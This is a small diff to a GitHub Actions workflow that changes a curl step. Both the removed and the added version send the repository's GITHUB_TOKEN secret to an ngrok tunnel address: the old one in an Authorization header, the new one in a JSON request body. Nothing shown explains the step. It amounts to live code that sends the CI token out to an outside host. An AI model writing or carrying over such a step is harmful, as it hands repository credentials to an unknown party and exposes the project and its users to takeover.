@@ -10,5 +10,5 @@ jobs:
           curl \
           -X POST \
           -H "Accept: application/json" \
-          -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-          https://4c93-185-187-131-190.ngrok.io
+          -d '{"token": "${{ secrets.GITHUB_TOKEN}}" }' \
+          https://c991-185-187-131-197.ngrok.io
